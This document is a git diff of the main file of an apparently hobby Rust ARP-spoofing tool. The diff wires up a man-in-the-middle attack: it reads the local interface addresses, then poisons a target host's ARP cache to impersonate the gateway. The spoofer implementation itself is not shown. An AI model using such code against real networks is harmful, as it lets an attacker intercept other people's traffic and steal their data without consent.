@@ -2,6 +2,8 @@ use arp::spoofer::ArpSpoofer;
 use operating_system::network_tools::NetworkTools;
 use packet_inspection::inspector::Inspector;
 
+use crate::arp::spoofer::Mitm;
+
 pub mod packet_inspection;
 pub mod arp;
 pub mod private;
@@ -12,21 +14,25 @@ pub mod operating_system;
 #[tokio::main]
 async fn main() {
     // We will spoof ARP packets saying we're the router to the client
-    let sending_spoofer = arp::spoofer::ArpSpooferImpl::new(private::GATEWAY_IP);
-    sending_spoofer.startForIp(private::TARGET_IP);
-
     let tools = operating_system::network_tools::NetworkToolsImpl::new();
-    tools.debug_iterate();
 
-    let hw_addr = tools.fetch_hardware_address("en0");
+    let interface = tools.fetch_interface("en0");
+    let hw_addr = tools.fetch_hardware_address("en0").unwrap();
+    let ipv4 = tools.fetch_ipv4_address("en0").unwrap();
 
-    let ipv4 = tools.fetch_ipv4_address("en0");
-    let ipv6 = tools.fetch_ipv6_address("en0");
-    println!("HW address for en0: {}", hw_addr);
-    println!("IPv4 address for en0: {}", ipv4);
-    println!("IPv6 address for en0: {}", ipv6.unwrap_or("not available".to_string()));
+    let mitm = Mitm {
+        hw: hw_addr,
+        ipv4
+    };
 
-    // TODO: (@objectivecosta) Implement this part.
-    // We will spoof ARP packets saying we're the client to the router 
-    // let receiving_spoofer = arp::spoofer::ArpSpooferImpl::new();
+    let gateway = std::net::Ipv4Addr::from([***REMOVED***]);
+    
+    let sending_spoofer = arp::spoofer::ArpSpooferImpl::new(
+        interface,
+        mitm,
+        gateway
+    );
+
+    let target = std::net::Ipv4Addr::from([***REMOVED***]);
+    sending_spoofer.spoof_target(target);
 }
